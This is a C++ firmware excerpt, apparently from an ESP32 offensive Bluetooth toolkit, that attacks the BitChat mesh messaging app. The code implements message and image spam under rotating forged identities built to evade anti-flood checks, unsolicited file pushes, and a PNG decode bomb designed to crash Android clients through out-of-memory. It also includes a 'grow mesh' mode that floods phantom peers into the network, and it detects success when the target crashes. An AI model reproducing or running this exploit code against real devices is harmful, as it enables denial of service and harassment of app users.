        { auto pl = buildAnnouncePayload(sp, sn);                           // annonce de ce pair frais
          auto apk = buildPacket(T_ANNOUNCE, sp.id, TTL_DEFAULT, pl.data(), pl.size(), sp.pub, sp.priv);
          sch->writeValue(apk.data(), apk.size(), true); }                  // with response
        if (!sc->isConnected()) continue;
        String m = msgs.empty() ? (msg + " " + String((int)sent)) : msgs[sent % msgs.size()];
        auto pkt = buildPacket(T_MESSAGE, sp.id, TTL_DEFAULT, (const uint8_t*)m.c_str(), m.length(), sp.pub, sp.priv);
        sch->writeValue(pkt.data(), pkt.size(), true);                      // with response : ACK -> plus de drop silencieux
        if (!sc->isConnected()) continue;
        sent++;
        status("Public Spam", (sn + ": " + String(sent) + "/" + String(count) + "  BKSP=stop").c_str(), TFT_GREEN);
        cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true;
        delay(20);                                                         // continu, juste un souffle
      }
      if (sc) sc->disconnect();
      if (failStreak >= 6) { status("Target unreachable", "too many connection failures", TFT_RED); delay(1300); }
    }
    else if (atk == 2) {       // IMG Spam : boucle d'envoi d'images de /evil/bitchat/img via fileTransfer (0x22),
                               // identite FRAICHE par image (anti-flood) + pseudo fixe ou base+random.
      std::vector<String> imgs;
      { File d = SD.open("/evil/bitchat/img");
        if (d) { for (File e = d.openNextFile(); e; e = d.openNextFile()) {
            if (!e.isDirectory()) { String n = bcBaseName(String(e.name())); String low = n; low.toLowerCase();
              if (low.endsWith(".jpg") || low.endsWith(".jpeg") || low.endsWith(".png") || low.endsWith(".gif")) imgs.push_back(n); }
            e.close(); if (imgs.size() >= 60) break; } d.close(); } }
      if (imgs.empty()) { status("No images", "ajoute des memes dans /evil/bitchat/img", TFT_ORANGE); delay(2200); cli->disconnect(); continue; }
      int count = askNum("Image sends (def 50) >", 50);
      std::vector<String> nicks; String base = "ghost"; bool rnd = false;   // pseudo : liste SD, ou clavier base(+random)
      if (bcYesNo("Custom nick list?")) {                   // /evil/bitchat/nicks/*.txt (comme Public Spam)
        String p = bcPickList("/evil/bitchat/nicks"); if (p.length()) bcLoadLines(p, nicks);
      }
      if (nicks.empty()) {                                  // sinon pseudo clavier : base (+ random optionnel)
        base = promptInput("Sender nick base (def ghost) >"); base.trim(); if (!base.length()) base = "ghost";
        rnd = bcYesNo("Random suffix per send?");           // No = pseudo fixe ; Yes = base+random (4 hex)
      }
      status("IMG Spam", (String(imgs.size()) + " memes / " + (nicks.size() ? (String(nicks.size()) + " nicks") : (String("nick ") + base + (rnd ? "+rnd" : "")))).c_str(), TFT_CYAN); delay(800);
      int failStreak = 0;
      while (sent < (uint32_t)count && !stop && failStreak < 6) {
        if (!cli->isConnected() || !chr) {                       // (re)connexion seulement si la cible tombe
          cli->disconnect(); delay(120);
          if (!cli->connect(&targets[ti])) { failStreak++; delay(300); cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true; continue; }
          cli->setMTU(517);
          BLERemoteService* ss = cli->getService(BLEUUID(SVC_UUID));
          chr = ss ? ss->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
          if (!chr) { failStreak++; continue; }
          failStreak = 0;
        }
        String iname = imgs[sent % imgs.size()];
        File f = SD.open("/evil/bitchat/img/" + iname, FILE_READ);
        if (!f) { sent++; continue; }
        uint32_t fsz = f.size();
        if (fsz == 0 || fsz > 8192) { f.close(); status("Skip (taille)", (iname + " " + String(fsz) + "o >8Ko").c_str(), TFT_ORANGE); delay(600); sent++; continue; }
        uint8_t* fbuf = (uint8_t*)malloc(fsz);
        if (!fbuf) { f.close(); status("Low heap", nullptr, TFT_RED); delay(900); break; }
        uint32_t rd = f.read(fbuf, fsz); f.close();
        auto tlv = buildFileTLV(iname, bcMime(iname), fbuf, rd);
        free(fbuf);
        // Garde heap : buildPacket signe l'image EN PLACE, donc la plus grosse alloc unique = le paquet p
        // (~tlv+86 o, en 1 reserve). On exige juste un bloc contigu un peu plus grand que tlv, sinon skip
        // propre (pas de bad_alloc). Marge 1536 o (avant 4096 = trop strict -> skippait a tort).
        if (ESP.getMaxAllocHeap() < tlv.size() + 1536) {
          status("Skip (heap)", (iname + "  heap bas").c_str(), TFT_ORANGE); delay(600); sent++; continue;
        }
        Phantom sp = makePhantom();                              // identite fraiche par image
        String sn = !nicks.empty() ? nicks[sent % nicks.size()] : (rnd ? (base + String((long)random(0x1000, 0x10000), HEX)) : base);
        { auto apl = buildAnnouncePayload(sp, sn);               // annonce du pair frais AVANT le fichier
          auto apk = buildPacket(T_ANNOUNCE, sp.id, TTL_DEFAULT, apl.data(), apl.size(), sp.pub, sp.priv);
          chr->writeValue(apk.data(), apk.size(), true); delay(350); }
        if (!cli->isConnected()) continue;
        auto pkt = buildPacket(T_FILE, sp.id, TTL_DEFAULT, tlv.data(), tlv.size(), sp.pub, sp.priv);
        bool ok = false; int nf = 0;
        if (pkt.size() <= 480) { chr->writeValue(pkt.data(), pkt.size(), false); delay(150); ok = true; }
        else ok = bcSendFragmented(chr, pkt, T_FILE, sp.id, nf);
        if (ok) { sent++; monPush("[TX  ] img " + iname + " " + String(rd) + "o" + (pkt.size() > 480 ? (" /" + String(nf) + "frag") : "")); }
        status("IMG Spam", (sn + "  " + iname + "  " + String(sent) + "/" + String(count) + "  BKSP=stop").c_str(), TFT_GREEN);
        cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true;
        delay(60);
      }
      if (failStreak >= 6) { status("Target unreachable", "too many connection failures", TFT_RED); delay(1300); }
    }
    else if (atk == 3) {       // Envoyer un fichier SD (image/son) via fileTransfer (type 0x22)
      String path, fname; File f; uint32_t fsz = 0; bool picked = false;
      while (!picked) {                                // re-selection si illisible/trop gros SANS couper la connexion
        path = bcPickFile("/");
        if (!path.length()) break;                     // DEL = annuler
        fname = bcBaseName(path);
        f = SD.open(path, FILE_READ);
        if (!f) { status("Lecture SD KO", path.c_str(), TFT_RED); delay(1300); continue; }
        fsz = f.size();
        if (fsz > 8192) { status("Too big (max 8KB)", (String(fsz) + "B : choose smaller").c_str(), TFT_RED); f.close(); delay(1500); continue; }
        picked = true;
      }
      if (!picked) { cli->disconnect(); continue; }    // annule -> retour menu
      uint8_t* fbuf = (uint8_t*)malloc(fsz ? fsz : 1);
      if (!fbuf) { status("Not enough heap", nullptr, TFT_RED); f.close(); delay(1500); cli->disconnect(); continue; }
      uint32_t rd = f.read(fbuf, fsz); f.close();
      status("Building file...", fname.c_str(), TFT_CYAN);
      auto tlv = buildFileTLV(fname, bcMime(fname), fbuf, rd);
      free(fbuf);
      Phantom me2 = makePhantom();
      // annonce le pair AVANT le transfert : la cible n'accepte un fichier que d'un pair connu+verifie
      if (cli->isConnected() && chr) {
        auto apl = buildAnnouncePayload(me2, "ghost");
        auto apk = buildPacket(T_ANNOUNCE, me2.id, TTL_DEFAULT, apl.data(), apl.size(), me2.pub, me2.priv);
        chr->writeValue(apk.data(), apk.size(), false); delay(1200);
      }
      auto pkt = buildPacket(T_FILE, me2.id, TTL_DEFAULT, tlv.data(), tlv.size(), me2.pub, me2.priv);
      bool ok = false;
      if (cli->isConnected() && chr && ESP.getFreeHeap() > 15000) {
        if (pkt.size() <= 480) {              // tient en un seul write BLE
          status("Sending file...", (String(pkt.size()) + "B (1 write)").c_str(), TFT_GREEN);
          chr->writeValue(pkt.data(), pkt.size(), false); delay(200); ok = true;
        } else {                              // trop gros -> fragmentation BitChat (type 0x20)
          int nf = 0;
          status("Sending fragmented...", (String(pkt.size()) + "B -> fragments 0x20").c_str(), TFT_GREEN);
          ok = bcSendFragmented(chr, pkt, T_FILE, me2.id, nf);
          if (ok) { status("File fragmented", (String(nf) + " fragments sent").c_str(), TFT_GREEN); delay(900); }
        }
      }
      monPush(ok ? ("[TX  ] file " + fname + " " + String(rd) + "o" + (pkt.size()>480?" fragmented":"")) : "[!  ] envoi fichier KO");
      sent = ok ? 1 : 0; delay(1000);
    }
    else if (atk == 4) {       // Image bomb : PNG 6000x6000 1-bit (144 Mo au decode) -> OutOfMemoryError
                               // non catche cote client Android (ImageMessageItem/FullScreenImageViewer
                               // decodent sans inSampleSize ; >100 Mo = crash RecordingCanvas). fileTransfer 0x22.
      if (!bcYesNo("Send PNG decode-bomb?")) { cli->disconnect(); continue; }
      int count = askNum("Sends (def 1) >", 1);
      // garde heap : le PNG est copie dans le TLV puis dans le paquet (~2x) ; exige de la marge
      if ((int)ESP.getMaxAllocHeap() < (int)PNGBOMB_LEN * 2 + 4096) {
        status("Low heap", "pas assez de RAM pour la bombe", TFT_RED); delay(1500); cli->disconnect(); continue;
      }
      // PNG constant -> on construit identite + paquet UNE SEULE fois (pas de churn heap par envoi)
      Phantom sp = makePhantom();
      std::vector<uint8_t> pkt, apk;
      { auto tlv = buildFileTLV("image.png", "image/png", PNGBOMB, PNGBOMB_LEN);
        pkt = buildPacket(T_FILE, sp.id, TTL_DEFAULT, tlv.data(), tlv.size(), sp.pub, sp.priv); }  // tlv libere ici
      { auto apl = buildAnnouncePayload(sp, "ghost");
        apk = buildPacket(T_ANNOUNCE, sp.id, TTL_DEFAULT, apl.data(), apl.size(), sp.pub, sp.priv); }
      int failStreak = 0;
      while (sent < (uint32_t)count && !stop && failStreak < 3) {   // cap bas : cible crashee = inutile d'insister
        if (!cli->isConnected() || !chr) {
          cli->disconnect(); delay(100);
          if (kp(KEY_BACKSPACE) || kp('`')) { stop = true; break; }
          if (!cli->connect(&targets[ti])) { failStreak++;
            status("Image bomb", (String("reconnect ") + failStreak + "/3 (cible crashee?)").c_str(), TFT_ORANGE);
            delay(150); cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true; continue; }
          cli->setMTU(517);
          BLERemoteService* ss = cli->getService(BLEUUID(SVC_UUID));
          chr = ss ? ss->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
          if (!chr) { failStreak++; continue; }
          failStreak = 0;
        }
        chr->writeValue(apk.data(), apk.size(), true); delay(300);          // annonce
        if (!cli->isConnected()) continue;
        int nf = 0; bool ok = bcSendFragmented(chr, pkt, T_FILE, sp.id, nf);  // 4.5Ko -> fragmente (0x20)
        if (ok) { sent++; monPush("[TX  ] pngbomb /" + String(nf) + "frag"); }
        status("Image bomb", (String("sent ") + String(sent) + "/" + String(count) + "  BKSP=stop").c_str(), TFT_RED);
        cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true;
        delay(250);
        // cible tombee apres un envoi = CRASH obtenu -> on s'arrete (pas de reconnexion futile = faux freeze)
        if (sent > 0 && !cli->isConnected()) { status("Target crashed", "lien tombe apres l'envoi (OOM)", TFT_GREEN); delay(1400); break; }
      }
      if (failStreak >= 3) { status("Target down", "injoignable (deja crashee ?)", TFT_GREEN); delay(1300); }
    }
    else if (atk == 5) {       // Grow mesh : injecte des pairs fantomes via announce-flood (AUCUN message)
      // EN CONTINU (pas de salves) : chaque ANNOUNCE a une identite FRAICHE -> le tel voit plein
      // d'expediteurs differents, pas un seul flooder -> pas d'anti-flood -> on tient UNE connexion.
      // Reconnexion SEULEMENT si elle tombe pour de vrai.
      int count = askNum("Phantom nodes (def 20) >", 20);
      std::vector<String> names; String base = "node";
      if (bcYesNo("Custom name list?")) {                    // /evil/bitchat/nicks/*.txt
        String p = bcPickList("/evil/bitchat/nicks");
        if (p.length()) { bcLoadLines(p, names); status("Grow mesh", (String(names.size()) + " names loaded").c_str(), TFT_CYAN); delay(700); }
      }
      if (names.empty()) { base = promptInput("Node nick base (def node) >"); base.trim(); if (!base.length()) base = "node"; }
      cli->disconnect(); delay(150);                         // on gere notre propre connexion (cleanup final = no-op sur)
      BLEClient* sc = nullptr; BLERemoteCharacteristic* sch = nullptr; int failStreak = 0;
      while (sent < (uint32_t)count && !stop && failStreak < 6) {
        if (!sc || !sc->isConnected() || !sch) {             // (re)connexion seulement si necessaire
          if (sc) { sc->disconnect(); delay(80); }
          sc = BLEDevice::createClient();
          if (!sc->connect(&targets[ti])) { failStreak++; sc->disconnect(); sc = nullptr; delay(300);
            cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true; continue; }
          sc->setMTU(517);
          BLERemoteService* ss = sc->getService(BLEUUID(SVC_UUID));
          sch = ss ? ss->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
          failStreak = 0;
          if (!sch) { sc->disconnect(); sc = nullptr; continue; }
        }
        Phantom sp = makePhantom();                          // identite FRAICHE = nouveau noeud mesh
        String nn = names.empty() ? (base + String((int)sent)) : names[sent % names.size()];
        auto pl = buildAnnouncePayload(sp, nn);
        auto apk = buildPacket(T_ANNOUNCE, sp.id, TTL_DEFAULT, pl.data(), pl.size(), sp.pub, sp.priv);
        sch->writeValue(apk.data(), apk.size(), true);       // with response : annonce vraiment recue
        sent++;
        status("Grow mesh", (String("node ") + nn + "  " + String(sent) + "/" + String(count) + "  BKSP=stop").c_str(), TFT_GREEN);
        cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true;
        delay(20);                                           // continu, juste un souffle
      }
      if (sc) sc->disconnect();
      if (failStreak >= 6) { status("Target unreachable", "too many connection failures", TFT_RED); delay(1300); }
    }

    // IMPORTANT : spam/grow-mesh deconnectent le cli partage -> appeler registerForNotify sur un
    // char DECONNECTE tente une ecriture CCCD vers un pair absent et HANG sans timeout (device bloque,
    // plus de retour menu). On ne le fait donc que si la connexion partagee est encore vivante.
    if (cli->isConnected() && chr && chr->canNotify()) chr->registerForNotify(nullptr);   // stoppe la synchro horloge
    keyRelease();   // draine la touche de sortie (BKSP/`) tenue par les boucles d'attaque
                    // -> evite qu'elle re-declenche sur le selectList du menu (fuite multi-niveaux)
    cli->disconnect();
    status("Done", (String(sent) + " packets sent").c_str(), TFT_CYAN);
    delay(1200);
  }

  // Liberation BLE ROBUSTE : le mode Node laisse un serveur + advertising actifs ; sans
  // arret propre, le controleur reste occupe et les AUTRES modules BLE (ledbgone, chameleon,
  // drone, radar...) ne se lancent plus. On stoppe l'advertising + on laisse le temps au
  // controleur de se liberer avant/apres le deinit.
  BLEDevice::stopAdvertising();
  delay(60);
  // FIX reboot (esp_bt_controller_mem_release -> ESP_FAIL -> ESP_ERROR_CHECK abort) : deinit(true)
  // force le mem_release one-shot NON idempotent. Apres le churn de BLEClient des boucles de spam
  // (connect/disconnect repetes) ou l'enchainement de modules BLE, Bluedroid est deja down -> le
  // ESP_ERROR_CHECK du core abort sur le ESP_FAIL. deinit(false) demonte le BLE SANS mem_release
  // (re-init propre au prochain module). RAM boot inchangee : le BLE n'est pas init au boot.
  if (BLEDevice::getInitialized()) BLEDevice::deinit(false);
  delay(120);                // laisse le controleur BT se liberer avant le prochain module BLE
}
